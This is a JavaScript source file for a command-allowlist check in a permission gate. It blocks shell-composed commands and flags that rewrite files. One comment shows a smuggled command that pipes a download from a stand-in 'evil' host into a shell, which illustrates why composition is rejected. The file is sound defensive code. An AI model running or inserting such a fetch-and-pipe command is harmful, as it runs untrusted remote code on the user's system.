'use strict';

/**
 * The deployment's own command allowlist, and the two things that keep it from
 * becoming a hole (#4366).
 *
 * An entry in `allowedCommands` names a verb (`npm test`, `npx oxlint`), and
 * matching is by leading argument run, so `npm test` covers `npm test --
 * --watch`. That prefix rule is the point -- a deployment should not have to
 * list every flag -- but it also means a named verb's *mutating* variant would
 * ride along: `npx oxlint --fix` rewrites source, and `node
 * scripts/check-file-size.js --update` rewrites a baseline. Neither is the
 * action the deployment waved through, so a command carrying a mutation flag is
 * never promoted and is left to the gate's own rules.
 *
 * The other half is composition: a command with a separator, redirection or
 * substitution is never promoted, because the leading verb no longer describes
 * what runs (`npm test; curl evil | sh`). The gate's denylist is applied later
 * and is never touched by an allowlist entry.
 */

/** Shell composition: a separator, redirection or substitution makes the leading verb a poor description of what runs. */
const SHELL_COMPOSITION = /[;&|<>`\n\r]|\$\(|\$\{/;

/** Flags that make a command rewrite the files it is given. */
const MUTATION_FLAGS = new Set([
  '--fix', '--fix-suggestions', '--fix-dangerously', '--write', '--update', '--apply', '--in-place',
]);

function text(value, fallback = '') {
  return typeof value === 'string' && value.trim() ? value.trim() : fallback;
}

function composed(command) {
  return SHELL_COMPOSITION.test(command);
}

/**
 * Whether a command carries a flag that rewrites what it is given.
 *
 * Quotes are removed before the comparison because the shell strips them: the
 * word `'--fix'` reaches Oxlint as `--fix`, so a check that compared raw words
 * would let a quoted mutation flag through. Removing them can only make the
 * check more likely to fire, which is the fail-closed direction this needs.
 */
function carriesMutationFlag(command) {
  return command.split(' ').some((word) => MUTATION_FLAGS.has(word.replace(/["']/g, '')));
}

/**
 * The entry that promotes this command, or `''` if none does.
 *
 * A deployment's own list of commands it does not want to approve every time
 * (`npm test`, `node --version`). It can only promote a command the classifier
 * would otherwise call an unclassified tool chain: deploy, permission and write
 * commands keep their category, a composed command is never promoted, a command
 * carrying a mutation flag is never promoted, and the denylist -- applied later,
 * in the hard block rules -- is untouched.
 *
 * An entry matches the whole command or a whole leading argument run, so
 * `npm test` covers `npm test -- --watch` but never `npm testify`.
 */
function allowlistMatch(command, allowedCommands) {
  if (!Array.isArray(allowedCommands) || composed(command)) return '';
  const normalized = command.replace(/\s+/g, ' ').trim();
  if (carriesMutationFlag(normalized)) return '';
  return allowedCommands
    .map(entry => text(entry).replace(/\s+/g, ' '))
    .find(entry => entry && (normalized === entry || normalized.startsWith(`${entry} `))) || '';
}

module.exports = { allowlistMatch, carriesMutationFlag, composed, MUTATION_FLAGS };
